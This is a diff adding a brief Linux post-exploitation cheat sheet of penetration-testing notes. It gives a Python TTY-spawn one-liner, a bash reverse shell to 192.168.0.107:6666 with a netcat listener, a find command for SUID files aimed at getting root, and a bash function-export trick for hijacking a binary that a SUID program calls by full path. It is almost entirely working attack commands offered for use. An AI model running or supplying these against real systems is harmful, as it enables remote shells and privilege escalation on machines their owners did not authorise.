@@ -1,0 +1,35 @@
+Spawn TTY
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+Redirect bash to tcp socket
+
+/bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
+# then at receiver:
+nc -l -n -v -p 6666
+# And wait for incoming bash shell
+
+
+Find SUID/SGUID files for privilege escalation
+
+find / -user root -perm -4000 -print 2>/dev/null
+
+Of course if you can somehow exploit these results, you might get root
+
+
+
+Hijack a binary’s full path in bash to exec your own code
+
+$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
+$ export -f /usr/bin/foo
+$ /usr/bin/foo
+It works
+
+Of course you might want this if a SUID bit programing is calling some binary by full path and you cannot alter that binary but want to hijack the execution
+
+
+
+take quick screenshot within linux:
+import <filename.png>
+
